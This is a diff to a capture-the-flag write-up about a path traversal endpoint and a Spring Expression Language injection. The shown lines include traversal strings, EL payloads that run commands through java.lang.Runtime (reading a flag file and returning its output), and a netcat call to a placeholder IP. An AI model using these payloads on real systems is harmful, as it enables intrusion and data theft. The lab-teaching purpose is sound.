@@ -25,11 +25,13 @@ Starting off with "Download PDF" on our desired TV, revealed us some interesting
 
 ![Download PDF TV product](https://gyazo.com/128fd40b03d94ce50ebd7c402f987016.png)
 
-As we can already identify, a GET request is being sent to "/downloadFile" endpoint with a very interesting parameter, which is `file`, and it actually specifies a file that is stored on the web server. Usually, applications should validate user input, so when a page receives the given input it will escape all unauthorized signs as of **`/`**, **`.`**. So we can send some of the following at the beginning of the desired file:
+As we can already identify, a GET request is being sent to "/downloadFile" endpoint with a very interesting parameter, which is `file`, and it actually specifies a file that is stored on the web server. Usually, applications should validate user input, so when a page receives the given input it will escape all unauthorized signs as of **`/`**, **`.`**. here are some common path traversal strings:
 
 > **`..`**
 > **`../`**
 > **`.././`**
+
+So in case we try and reach for a file that was not intended by the developer, it would not work. 
 
 Sometimes its better to visualize it by looking at an code example, and understand whats actually happens. lets take this PHP code for an example:
 
@@ -210,7 +212,6 @@ func calc (w http.ResponseWriter, r *http.Request) {
 
 When analyzing the `calc()` function we see that a `POST` request is being sent to `CALCULATION_SERVER`, following three parameters: `item_id`, `country_code`, and `quantity`.
 Sending the request with random numbers actually worked.
-me when i.
 
 ![Sending a request to calc](https://gyazo.com/d5cafc6762797fe0d70708e4d8d2c70d.png)
 
@@ -224,7 +225,7 @@ Let's try and add some special signs and see what we get.
 
 ![Let the story begin](https://gyazo.com/568c58003c620940eceb2df17f6cfea9.png)
 
-Obviously "Expression Language" is being used here, So cancel all your appointments, We've got some work to do!
+Obviously "Expression Language" is being used here, so cancel all your appointments, we've got some work to do!
 
 ## Expression Language Injection
 
@@ -254,10 +255,10 @@ T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')
 Nice, so we **verified our code execution** on the web server, let's try and grab our flag. 
 
 So in order to get output in the HTTP Response, we will use the "Spring Framework" `StreamUtils` class and call the `copyToString()` method. We can pass an input stream to this method and get the contents of the stream as a response.
-the finaly payload should look like the following: 
+In order to get the flag, we had to fuzz around the server, and find its location, which was under "/home/ubuntu/flag". here is the final payload:
 
 ```java
-T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream(),'utf-8')
+T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat%20/home/ubuntu/flag').getInputStream(),'utf-8')
 ```
 ![Flag via ELi](https://gyazo.com/313633ccdab5e833cd3c120ca34eed08.png)
 
